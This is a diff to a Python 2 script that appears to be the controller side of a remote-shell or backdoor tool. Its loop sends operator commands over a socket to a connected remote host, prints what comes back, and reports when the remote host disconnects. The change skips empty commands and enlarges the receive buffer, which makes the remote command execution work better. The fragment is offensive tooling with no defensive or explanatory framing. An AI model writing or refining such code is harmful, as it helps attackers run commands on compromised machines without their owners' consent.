@@ -157,16 +157,18 @@ def main():
                     print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)    
             else:
                 try:
-                    conn.send(command)
-                    try:
-                        s.settimeout(5.0)
-                        conn.settimeout(5.0)     
-                        data = conn.recv(1024)
-                        print data
-                        s.settimeout(None)
-                        conn.settimeout(None) 
-                    except:
-                        print '[*] ᴄᴏᴍᴍᴀɴᴅ ᴇxᴇᴄᴜᴛᴇᴅ'
+                    if command != '':
+                        data = ''
+                        conn.send(command)
+                        try:
+                            s.settimeout(5.0)
+                            conn.settimeout(5.0)     
+                            data = conn.recv(4096)
+                            print data
+                            s.settimeout(None)
+                            conn.settimeout(None) 
+                        except:
+                            print '[*] ᴄᴏᴍᴍᴀɴᴅ ᴇxᴇᴄᴜᴛᴇᴅ'
                 except:
                     print '\n'
                     print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
@@ -180,7 +182,3 @@ def main():
 if __name__ == '__main__':
 
     main()
-
-
-
-
